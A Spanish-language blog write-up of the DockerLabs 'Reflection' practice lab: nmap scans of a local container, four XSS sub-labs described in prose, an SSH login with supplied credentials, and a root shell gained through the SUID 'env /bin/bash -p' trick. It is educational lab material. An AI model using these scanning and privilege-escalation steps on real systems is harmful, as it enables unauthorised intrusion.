---
title: DockerLabs - Reflection
summary: "Write-up del laboratorio Reflection de DockerLabs"
author: elcybercurioso
date: 2025-11-04 20:35:55
categories: [Post, DockerLabs]
tags: [fácil, xss, privesc, suid]
media_subpath: "/assets/img/posts/dockerlabs_reflection"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 14:10 GMT
Initiating ARP Ping Scan at 14:10
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:10, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:10
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:10, 0.62s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -sCV -p22,80 172.17.0.2                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 14:10 GMT
Nmap scan report for 172.17.0.2
Host is up (0.000087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 89:6c:a5:af:d5:e2:83:6c:f9:87:33:44:0f:78:48:3a (ECDSA)
|_  256 65:32:42:95:ca:d0:53:bb:28:a5:15:4a:9c:14:64:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Laboratorio de Cross-Site Scripting (XSS)
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

## explotación

En este laboratorio nos encontramos que lo primero que debemos completar son 4 sub-laboratorios que tratan distintos tipos de XXS (Cross-Site Scripting):

![Desktop View](/20251103151135.webp){: width="972" height="589" .shadow}

### Laboratorio 1

El primer sub-laboratorio trata el caso de un XSS reflejado, donde lo que introduzcamos en un campo se ve reflejado en otro, haciendo que si no se ha sanitizado correctamente el input del usuario, de pueda acontecer este tipo de vulnerabilidades:

![Desktop View](/20251103152643.webp){: width="972" height="589" .shadow}

### Laboratorio 2

El segundo sub-laboratorio aborda el caso de los XSS en los que el payload no es necesario que viaje en cada petición, ya que el servidor cuenta con una funcionalidad que guarda dicho payload en la página, haciendo que cualquier usuario que acceda a esta funcionalidad se vea afectado por esta vulnerabilidad:

![Desktop View](/20251103152747.webp){: width="972" height="589" .shadow}

### Laboratorio 3

El tercer sub-laboratorio nos habla sobre los casos en los que, interceptando una solicitud, llegamos a poder modificar el valor indicado en los desplegables, haciendo que, si lo que hemos seleccionado se ve reflejado en la página, podemos llegar a explotar esta vulnerabilidad:

![Desktop View](/20251103152318.webp){: width="972" height="589" .shadow}

### Laboratorio 4

El cuarto sub-laboratorio nos comenta que lo que indiquemos en la URL en el parámetro `?data=` se verá reflejado en la respuesta, haciendo que el payload viaje en la URL en las peticiones GET:

![Desktop View](/20251103152605.webp){: width="972" height="589" .shadow}

Tras completar los laboratorios, accedemos por SSH con las credenciales que nos facilitan:

![Desktop View](/20251103152922.webp){: width="972" height="589" .shadow}

![Desktop View](/20251103152911.webp){: width="972" height="589" .shadow}

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ ssh balu@172.17.0.2                                                  
balu@172.17.0.2's password: 
balu@7e89bfc0249e:~$ whoami
balu
balu@7e89bfc0249e:~$ hostname -I
172.17.0.2 
```

## escalada de privilegios

Una vez dentro, comprobamos que el binario `/usr/bin/env` tiene permisos SUID:

```bash
balu@7e89bfc0249e:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/env
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

 Vemos en [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) que podemos aprovecharnos de esta configuración para poder obtener una consola como el usuario `root`:

![Desktop View](/20251103153316.webp){: width="972" height="589" .shadow}

Tras ejecutar el comando que nos indican, vemos que nos hemos convertido en `root`:

```bash
balu@7e89bfc0249e:~$ env /bin/bash -p
bash-5.2# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>